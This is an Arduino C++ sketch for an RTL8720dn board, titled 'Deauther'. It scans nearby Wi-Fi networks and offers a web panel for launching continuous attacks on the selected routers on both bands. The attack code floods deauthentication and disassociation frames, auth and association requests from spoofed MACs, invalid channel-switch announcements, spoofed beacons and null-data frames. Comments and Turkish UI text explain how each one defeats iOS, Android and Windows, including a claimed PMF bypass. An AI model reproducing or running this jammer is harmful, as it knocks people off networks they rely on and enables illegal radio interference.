#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red:   System active, web server running
//  Green: Web server handling a request
//  Blue:  Deauth/Disassoc frame being sent

// ─── Configuration ────────────────────────────────────────────────────────────
char *ssid = "X";
char *pass = "20192019";

// Frames sent per channel burst (×4 frame types = effective 80 frames per target)
#define FRAMES_PER_DEAUTH     20
// How often to re-scan and refresh target channels while attacking (ms)
#define RESCAN_INTERVAL_MS    30000UL
// Delay between individual frames (ms)
#define FRAME_DELAY_MS        1
// Delay between targets (ms)
#define TARGET_GAP_MS         8

// Common fallback channels to try when pair channel is not yet known from scan
static const uint8_t COMMON_5GHZ[]  = {36, 40, 44, 48, 149, 153, 157, 161};
static const uint8_t COMMON_24GHZ[] = {1, 6, 11};
static const int COMMON_5GHZ_LEN    = 8;
static const int COMMON_24GHZ_LEN   = 3;

// ─── Data Structures ──────────────────────────────────────────────────────────
typedef struct {
  String  ssid;
  String  bssid_str;
  uint8_t bssid[6];
  short   rssi;
  uint8_t channel;
} WiFiScanResult;

typedef struct {
  uint8_t bssid[6];        // Primary BSSID (from selection)
  uint8_t bssid_pair[6];   // Derived pair BSSID (last byte ±1)
  bool    has_pair;        // Whether pair BSSID has been computed
  uint8_t channel;         // Last known primary channel
  uint8_t channel_pair;    // Last known pair channel (0 = unknown)
  String  ssid;            // Display label
} DeauthTarget;

// ─── Globals ──────────────────────────────────────────────────────────────────
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<DeauthTarget>   deauth_targets;   // Persistent across router reboots
WiFiServer server(80);
unsigned long last_rescan_ms   = 0;
int           guess_5g_idx     = 0;   // cycling index for unknown 5GHz pair channels
int           guess_24g_idx    = 0;   // cycling index for unknown 2.4GHz pair channels

// Flood MAC counter — incremented per fake auth/assoc frame to get unique MACs
// Using locally administered bit (0x02) so frames look plausible
static uint32_t flood_mac_counter = 0x11223344;

// ─── Helpers ──────────────────────────────────────────────────────────────────

bool bssidEqual(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

// Derive the pair BSSID: same first 5 bytes, last byte ±1
// If primary is 2.4GHz  → pair = last_byte + 1 (5GHz band)
// If primary is 5GHz    → pair = last_byte - 1 (2.4GHz band)
void computePairBSSID(const uint8_t *src, uint8_t channel, uint8_t *pair_out) {
  memcpy(pair_out, src, 6);
  if (channel <= 14) {
    pair_out[5] = src[5] + 1;   // 2.4GHz → pair is 5GHz (+1)
  } else {
    pair_out[5] = src[5] - 1;   // 5GHz → pair is 2.4GHz (-1)
  }
}

// After a scan, refresh channel info for all active targets (and their pairs)
void updateTargetChannels() {
  for (auto &target : deauth_targets) {
    for (auto &result : scan_results) {
      if (bssidEqual(target.bssid, result.bssid)) {
        target.channel = result.channel;
        DEBUG_SER_PRINT("Updated primary channel for " + target.ssid + ": " + String(target.channel) + "\n");
      }
      if (target.has_pair && bssidEqual(target.bssid_pair, result.bssid)) {
        target.channel_pair = result.channel;
        DEBUG_SER_PRINT("Updated pair channel for " + target.ssid + ": " + String(target.channel_pair) + "\n");
      }
    }
  }
}

// Find the scan result index of a paired network (BSSIDs match in first 5 bytes, last byte ±1)
int findPairInScan(uint32_t i) {
  for (uint32_t j = 0; j < scan_results.size(); j++) {
    if (j == i) continue;
    if (memcmp(scan_results[i].bssid, scan_results[j].bssid, 5) == 0) {
      int diff = (int)scan_results[j].bssid[5] - (int)scan_results[i].bssid[5];
      if (diff == 1 || diff == -1) return (int)j;
    }
  }
  return -1;
}

// ─── Attack Core ──────────────────────────────────────────────────────────────

// Build the next unique locally-administered flood MAC from the counter
void nextFloodMAC(uint8_t *mac) {
  flood_mac_counter++;
  mac[0] = 0x02; // locally administered, unicast
  mac[1] = 0xAA;
  mac[2] = (flood_mac_counter >> 24) & 0xFF;
  mac[3] = (flood_mac_counter >> 16) & 0xFF;
  mac[4] = (flood_mac_counter >>  8) & 0xFF;
  mac[5] =  flood_mac_counter        & 0xFF;
}

/*
 * Full multi-method attack burst on one BSSID/channel combination.
 * ALL frame types fired in every burst — no cycling needed.
 *
 * Per iteration (FRAMES_PER_DEAUTH = 20 iterations):
 *   Deauth  2,3,4,6,8  — broadcast kicks (Android done, iOS done)
 *   Disassoc 2,3,8     — forces full re-assoc (iOS/Android)
 *
 * Windows PMF bypass (runs FRAMES_PER_DEAUTH times extra):
 *   Auth Flood      — fake Open-System auth from unique MAC → fills AP table
 *   Assoc Flood     — fake assoc request from same MAC → claims table slot
 *   CSA frame ×2   — Channel Switch Announcement → invalid channel (ch14/ch14)
 *                     Windows drivers honor CSA even from unauthenticated sources
 *
 * Total: ~(8+3) frames × 20 + 2 CSA = ~222 frames per channel burst
 */
void attackBSSID(uint8_t *bssid, uint8_t channel) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t flood_mac[6];

  wext_set_channel(WLAN0_NAME, channel);
  digitalWrite(LED_B, HIGH);

  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
    // ── Deauth/Disassoc (Android ✓, iOS ✓, Windows without PMF ✓) ──
    wifi_tx_deauth_frame  (bssid, broadcast, 2); delay(FRAME_DELAY_MS);
    wifi_tx_deauth_frame  (bssid, broadcast, 3); delay(FRAME_DELAY_MS);
    wifi_tx_deauth_frame  (bssid, broadcast, 4); delay(FRAME_DELAY_MS);
    wifi_tx_deauth_frame  (bssid, broadcast, 6); delay(FRAME_DELAY_MS);
    wifi_tx_deauth_frame  (bssid, broadcast, 8); delay(FRAME_DELAY_MS);
    wifi_tx_disassoc_frame(bssid, broadcast, 2); delay(FRAME_DELAY_MS);
    wifi_tx_disassoc_frame(bssid, broadcast, 3); delay(FRAME_DELAY_MS);
    wifi_tx_disassoc_frame(bssid, broadcast, 8); delay(FRAME_DELAY_MS);

    // ── Auth + Assoc flood — PMF-exempt, exhausts AP table (Windows ✓) ──
    // Each iteration uses a fresh MAC so the table fills with distinct entries
    nextFloodMAC(flood_mac);
    wifi_tx_auth_frame (bssid, flood_mac); delay(FRAME_DELAY_MS);
    wifi_tx_assoc_frame(bssid, flood_mac); delay(FRAME_DELAY_MS);
  }

  // ── CSA: Channel Switch Announcement — Windows honors these (Windows ✓) ──
  // Point clients at ch14 (invalid in EU/TR) to strand them off-channel
  wifi_tx_csa_frame(bssid, 14); delay(FRAME_DELAY_MS);
  wifi_tx_csa_frame(bssid, 14); delay(FRAME_DELAY_MS);
  wifi_tx_csa_frame(bssid, 14); delay(FRAME_DELAY_MS);

  digitalWrite(LED_B, LOW);
}

/*
 * Attack a full DeauthTarget:
 *   - Primary BSSID on primary channel
 *   - Pair BSSID on pair channel (known or guessed from common channel list)
 *   - This ensures the router's internet access is cut on BOTH bands simultaneously
 */
// iOS-specific supplement: beacon flood + null data flood on a given band
// Called after attackBSSID() to maximise disruption of iOS reconnection cycle
void iosSupplementAttack(uint8_t *bssid, uint8_t channel, const String &ssid) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t null_mac[6];

  wext_set_channel(WLAN0_NAME, channel);

  // ── Beacon flood with target SSID ──────────────────────────────────────────
  // iOS is always scanning for known SSIDs. Sending beacons spoofed as the real
  // AP mid-reconnect keeps iOS's state machine busy evaluating the "AP" signal
  // instead of completing the 4-way handshake — prolongs disconnection window.
  if (ssid.length() > 0 && ssid != "(hidden)") {
    for (int i = 0; i < 10; i++) {
      wifi_tx_beacon_frame(bssid, broadcast, ssid.c_str());
      delay(FRAME_DELAY_MS);
    }
  }

  // ── Null Data flood (PM=1) ─────────────────────────────────────────────────
  // Each unique fake MAC tells the AP "I'm sleeping, buffer my frames."
  // AP's power-save queue fills → AP stalls real frame delivery even when
  // iOS does briefly reconnect — throughput collapses without full disconnect.
  for (int i = 0; i < 10; i++) {
    nextFloodMAC(null_mac);
    wifi_tx_null_frame(bssid, null_mac);
    delay(FRAME_DELAY_MS);
  }
}

void attackTarget(DeauthTarget &target) {
  // --- Primary band ---
  attackBSSID(target.bssid, target.channel);
  iosSupplementAttack(target.bssid, target.channel, target.ssid);
  delay(TARGET_GAP_MS);

  if (!target.has_pair) return;

  // --- Pair band ---
  if (target.channel_pair > 0) {
    attackBSSID(target.bssid_pair, target.channel_pair);
    iosSupplementAttack(target.bssid_pair, target.channel_pair, target.ssid);
  } else {
    if (target.channel <= 14) {
      uint8_t ch = COMMON_5GHZ[guess_5g_idx % COMMON_5GHZ_LEN];
      attackBSSID(target.bssid_pair, ch);
      iosSupplementAttack(target.bssid_pair, ch, target.ssid);
      guess_5g_idx++;
    } else {
      uint8_t ch = COMMON_24GHZ[guess_24g_idx % COMMON_24GHZ_LEN];
      attackBSSID(target.bssid_pair, ch);
      iosSupplementAttack(target.bssid_pair, ch, target.ssid);
      guess_24g_idx++;
    }
  }

  delay(TARGET_GAP_MS);
}

// ─── WiFi Scan ────────────────────────────────────────────────────────────────
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid    = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi    = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
      result.bssid[0], result.bssid[1], result.bssid[2],
      result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    updateTargetChannels();
    last_rescan_ms = millis();
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

// ─── HTTP Helpers ─────────────────────────────────────────────────────────────
String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end   = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
  std::vector<std::pair<String, String>> post_params;
  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1) return post_params;
  body_start += 4;
  String post_data = request.substring(body_start);

  int start = 0;
  int end   = post_data.indexOf('&', start);
  while (end != -1) {
    String kv    = post_data.substring(start, end);
    int    delim = kv.indexOf('=');
    if (delim != -1) post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
    start = end + 1;
    end   = post_data.indexOf('&', start);
  }
  String kv    = post_data.substring(start);
  int    delim = kv.indexOf('=');
  if (delim != -1) post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
  return post_params;
}

String makeResponse(int code, String content_type) {
  String r  = "HTTP/1.1 " + String(code) + " OK\n";
         r += "Content-Type: " + content_type + "\n";
         r += "Connection: close\n\n";
  return r;
}

String makeRedirect(String url) {
  return "HTTP/1.1 307 Temporary Redirect\nLocation: " + url;
}

// ─── Web UI ───────────────────────────────────────────────────────────────────
void handleRoot(WiFiClient &client) {
  bool attacking = (deauth_targets.size() > 0);

  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauther</title>
    <style>
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 960px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
      h1, h2 { color: #2c3e50; }
      table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
      th, td { padding: 9px 12px; text-align: left; border-bottom: 1px solid #ddd; }
      th { background: #2c3e50; color: #fff; }
      tr:nth-child(even) { background: #f0f0f0; }
      .group-header td { background: #dce8f5; font-weight: bold; font-size: 0.85em; color: #1a252f; padding: 4px 12px; }
      .row-2g { background: #eaf4fb !important; border-left: 4px solid #3498db; }
      .row-5g { background: #eafbf1 !important; border-left: 4px solid #27ae60; }
      .badge { display:inline-block; padding:2px 7px; border-radius:3px; font-size:.78em; font-weight:bold; color:#fff; }
      .b2g { background:#3498db; } .b5g { background:#27ae60; }
      form { background:#fff; padding:20px; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin-bottom:20px; }
      input[type=submit] { padding:10px 22px; border:none; border-radius:4px; cursor:pointer; font-size:1em; color:#fff; transition:background .2s; }
      .btn-attack  { background:#e74c3c; } .btn-attack:hover  { background:#c0392b; }
      .btn-stop    { background:#e67e22; } .btn-stop:hover    { background:#ca6f1e; }
      .btn-rescan  { background:#3498db; } .btn-rescan:hover  { background:#2980b9; }
      input[type=text] { padding:7px; border:1px solid #ccc; border-radius:4px; width:90px; margin-right:8px; }
      .cb-grp  { transform:scale(1.3); cursor:pointer; accent-color:#8e44ad; }
      .cb-net  { transform:scale(1.2); cursor:pointer; }
      .status-bar { padding:10px 16px; border-radius:5px; margin-bottom:16px; font-weight:bold; }
      .status-on  { background:#fdecea; border:1px solid #e74c3c; color:#c0392b; }
      .status-off { background:#eafaf1; border:1px solid #27ae60; color:#1e8449; }
    </style>
    <script>
      function toggleGroup(id) {
        var cb = document.getElementById('grp_' + id);
        document.querySelectorAll('.grp_' + id).forEach(function(el){ el.checked = cb.checked; });
      }
    </script>
  </head>
  <body>
    <h1>&#9889; RTL8720dn Deauther</h1>
  )";

  // Status bar
  if (attacking) {
    response += "<div class='status-bar status-on'>&#128308; ATTACK ACTIVE &mdash; " + String(deauth_targets.size()) + " target(s) | Auto-rescan every 30s</div>";
  } else {
    response += "<div class='status-bar status-off'>&#128994; IDLE &mdash; No active attack</div>";
  }

  // Stop / rescan row
  response += "<form method='post' action='/stop' style='display:inline-block;margin-right:10px;padding:10px 16px;'>";
  response += "<input class='btn-stop' type='submit' value='&#9632; Stop Attack'></form>";
  response += "<form method='post' action='/rescan' style='display:inline-block;padding:10px 16px;'>";
  response += "<input class='btn-rescan' type='submit' value='&#8635; Rescan Networks'></form><br><br>";

  // Network table
  response += "<h2>WiFi Networks</h2>";
  response += "<form method='post' action='/deauth'>";
  response += "<table><tr><th>Grp</th><th>Sel</th><th>#</th><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th>Band</th></tr>";

  std::vector<bool> rendered(scan_results.size(), false);
  int group_id = 0;

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (rendered[i]) continue;
    int pair_idx = findPairInScan(i);

    if (pair_idx != -1 && !rendered[pair_idx]) {
      int idx_2g = (scan_results[i].channel <= 14) ? (int)i : pair_idx;
      int idx_5g = (scan_results[i].channel <= 14) ? pair_idx : (int)i;
      String gid = String(group_id);
      String label = (scan_results[idx_2g].ssid.length() > 0) ? scan_results[idx_2g].ssid : "(hidden)";

      response += "<tr class='group-header'><td colspan='8'>&#128279; Paired Router &mdash; " + label;
      response += " &nbsp;<input class='cb-grp' type='checkbox' id='grp_" + gid + "' onclick='toggleGroup(" + gid + ")'> Select Both</td></tr>";

      // 2.4 GHz row
      String s2g = (scan_results[idx_2g].ssid.length() > 0) ? scan_results[idx_2g].ssid : "(hidden)";
      response += "<tr class='row-2g'><td></td>";
      response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_2g) + "'></td>";
      response += "<td>" + String(idx_2g) + "</td><td>" + s2g + "</td>";
      response += "<td>" + scan_results[idx_2g].bssid_str + "</td>";
      response += "<td>" + String(scan_results[idx_2g].channel) + "</td>";
      response += "<td>" + String(scan_results[idx_2g].rssi) + "</td>";
      response += "<td><span class='badge b2g'>2.4GHz</span></td></tr>";

      // 5 GHz row
      String s5g = (scan_results[idx_5g].ssid.length() > 0) ? scan_results[idx_5g].ssid : "(hidden)";
      response += "<tr class='row-5g'><td></td>";
      response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_5g) + "'></td>";
      response += "<td>" + String(idx_5g) + "</td><td>" + s5g + "</td>";
      response += "<td>" + scan_results[idx_5g].bssid_str + "</td>";
      response += "<td>" + String(scan_results[idx_5g].channel) + "</td>";
      response += "<td>" + String(scan_results[idx_5g].rssi) + "</td>";
      response += "<td><span class='badge b5g'>5GHz</span></td></tr>";

      rendered[i] = rendered[pair_idx] = true;
      group_id++;

    } else {
      String label = (scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(hidden)";
      bool is5g    = (scan_results[i].channel >= 36);
      String rowcls = is5g ? "row-5g" : "row-2g";
      String badgec = is5g ? "b5g" : "b2g";
      String band   = is5g ? "5GHz" : "2.4GHz";

      response += "<tr class='" + rowcls + "'><td></td>";
      response += "<td><input class='cb-net' type='checkbox' name='network' value='" + String(i) + "'></td>";
      response += "<td>" + String(i) + "</td><td>" + label + "</td>";
      response += "<td>" + scan_results[i].bssid_str + "</td>";
      response += "<td>" + String(scan_results[i].channel) + "</td>";
      response += "<td>" + String(scan_results[i].rssi) + "</td>";
      response += "<td><span class='badge " + badgec + "'>" + band + "</span></td></tr>";
      rendered[i] = true;
    }
  }

  response += "</table>";
  response += "<p style='font-size:.85em;color:#555;'>Her saldırı burst'ünde tüm reason code'lar otomatik gönderilir: <b>2, 3, 4, 6, 8</b> (Deauth) + <b>2, 3, 8</b> (Disassoc) &mdash; iOS, Android ve Windows için eş zamanlı.</p>";
  response += "<input class='btn-attack' type='submit' value='&#9889; Launch Attack'></form>";

  // Active targets section
  if (attacking) {
    response += "<h2>Active Targets</h2><table>";
    response += "<tr><th>#</th><th>SSID</th><th>Primary BSSID</th><th>Ch</th><th>Pair BSSID</th><th>Pair Ch</th></tr>";
    for (uint32_t i = 0; i < deauth_targets.size(); i++) {
      char pbssid[18] = "—";
      if (deauth_targets[i].has_pair) {
        snprintf(pbssid, sizeof(pbssid), "%02X:%02X:%02X:%02X:%02X:%02X",
          deauth_targets[i].bssid_pair[0], deauth_targets[i].bssid_pair[1],
          deauth_targets[i].bssid_pair[2], deauth_targets[i].bssid_pair[3],
          deauth_targets[i].bssid_pair[4], deauth_targets[i].bssid_pair[5]);
      }
      char pbssid_str[18];
      snprintf(pbssid_str, sizeof(pbssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
        deauth_targets[i].bssid[0], deauth_targets[i].bssid[1],
        deauth_targets[i].bssid[2], deauth_targets[i].bssid[3],
        deauth_targets[i].bssid[4], deauth_targets[i].bssid[5]);
      String pch = deauth_targets[i].has_pair ?
        (deauth_targets[i].channel_pair > 0 ? String(deauth_targets[i].channel_pair) : "?") : "—";
      response += "<tr>";
      response += "<td>" + String(i) + "</td>";
      response += "<td>" + deauth_targets[i].ssid + "</td>";
      response += "<td>" + String(pbssid_str) + "</td>";
      response += "<td>" + String(deauth_targets[i].channel) + "</td>";
      response += "<td>" + String(pbssid) + "</td>";
      response += "<td>" + pch + "</td>";
      response += "</tr>";
    }
    response += "</table>";
  }

  response += R"(
    <h2>Gönderilen Frame'ler (Her Burst)</h2>
    <table>
      <tr><th>Tip</th><th>Detay</th><th>Yöntem</th><th>Hedef</th></tr>
      <tr><td>Deauth 0xC0</td><td>Reason 2,3,4,6,8</td><td>AP&rarr;Broadcast — PMF olmayanlarda çalışır</td><td>Android ✓ iOS ✓ Windows (PMF yok) ✓</td></tr>
      <tr><td>Disassoc 0xA0</td><td>Reason 2,3,8</td><td>AP&rarr;Broadcast — tam re-assoc zorlar</td><td>Android ✓ iOS ✓</td></tr>
      <tr style="background:#fff3cd;"><td>Auth Flood 0xB0</td><td>Open System, Seq=1</td><td>PMF-exempt: sahte MAC'lerle AP tablosunu doldurur, Windows yeniden bağlanamaz</td><td><b>Windows PMF ✓</b></td></tr>
      <tr style="background:#fff3cd;"><td>Assoc Flood 0x00</td><td>Assoc Request</td><td>Auth flood ile AP'nin tüm slot'larını tüketir</td><td><b>Windows PMF ✓</b></td></tr>
      <tr style="background:#ffe0e0;"><td>CSA 0xD0</td><td>Ch14 (geçersiz)</td><td>Channel Switch Announcement — Windows sürücüsünü geçersiz kanala yönlendirir</td><td><b>Windows ✓</b></td></tr>
      <tr style="background:#e8f4f8;"><td>Beacon Flood 0x80</td><td>Hedef SSID ile</td><td>AP'nin BSSID'inden hedef SSID beacon'ı — iOS'un reconnect state machine'ini meşgul eder, 4-way handshake'i tamamlatmaz</td><td><b>iOS ✓</b></td></tr>
      <tr style="background:#e8f4f8;"><td>Null Data 0x48+PM</td><td>PM=1, sahte MAC flood</td><td>AP'ye "istemci uyuyor" sinyali — AP buffer dolar, iOS reconnect etse bile frame teslim edilemez, throughput sıfırlanır</td><td><b>iOS ✓</b></td></tr>
    </table>
    <p style="font-size:.85em;color:#666;">
      Toplam: ~242 frame/kanal/tur &nbsp;|&nbsp; 
      deauth+disassoc &times;20 + auth+assoc flood &times;20 + CSA &times;3 + beacon &times;10 + null &times;10
    </p>
  </body></html>)";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String r = makeResponse(404, "text/plain") + "Not found!";
  client.write(r.c_str());
}

// ─── Setup ────────────────────────────────────────────────────────────────────
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());

  while (scanNetworks()) delay(1000);

  server.begin();
  digitalWrite(LED_R, HIGH);
}

// ─── Loop ─────────────────────────────────────────────────────────────────────
void loop() {
  // ── Web server ──
  WiFiClient client = server.available();
  if (client.connected()) {
    digitalWrite(LED_G, HIGH);
    String request;
    while (client.available()) {
      while (client.available()) request += (char)client.read();
      delay(1);
    }
    String path = parseRequest(request);
    DEBUG_SER_PRINT("Request: " + path + "\n");

    if (path == "/") {
      handleRoot(client);

    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      client.stop();
      digitalWrite(LED_G, LOW);
      scanNetworks();
      return;

    } else if (path == "/stop") {
      deauth_targets.clear();
      client.write(makeRedirect("/").c_str());

    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      std::vector<int> selected_indices;

      for (auto &param : post_data) {
        if (param.first == "network") {
          selected_indices.push_back(String(param.second).toInt());
        }
      }

      // Build persistent DeauthTarget list
      // Only add targets not already in the list (avoids duplicates on re-submit)
      for (int idx : selected_indices) {
        if (idx < 0 || idx >= (int)scan_results.size()) continue;

        // Check if already tracked
        bool already = false;
        for (auto &t : deauth_targets) {
          if (bssidEqual(t.bssid, scan_results[idx].bssid)) { already = true; break; }
        }
        if (already) continue;

        DeauthTarget target;
        memcpy(target.bssid, scan_results[idx].bssid, 6);
        target.channel      = scan_results[idx].channel;
        target.ssid         = (scan_results[idx].ssid.length() > 0) ? scan_results[idx].ssid : "(hidden)";
        target.channel_pair = 0;

        // Derive pair BSSID from BSSID ±1
        computePairBSSID(target.bssid, target.channel, target.bssid_pair);
        target.has_pair = true;

        // If the pair is actually in the scan results, grab its channel now
        for (auto &result : scan_results) {
          if (bssidEqual(target.bssid_pair, result.bssid)) {
            target.channel_pair = result.channel;
            break;
          }
        }

        deauth_targets.push_back(target);
        DEBUG_SER_PRINT("Added target: " + target.ssid + " ch=" + String(target.channel) + "\n");
      }

      client.write(makeRedirect("/").c_str());

    } else {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }

  // ── Attack loop ──
  if (deauth_targets.size() == 0) return;

  // Periodic re-scan to refresh channels (router may have rebooted on same/new channel)
  if (millis() - last_rescan_ms >= RESCAN_INTERVAL_MS) {
    DEBUG_SER_PRINT("Periodic re-scan...\n");
    scanNetworks();   // updates target channels via updateTargetChannels()
  }

  // Attack every target in the list
  for (uint32_t i = 0; i < deauth_targets.size(); i++) {
    attackTarget(deauth_targets[i]);
  }
}
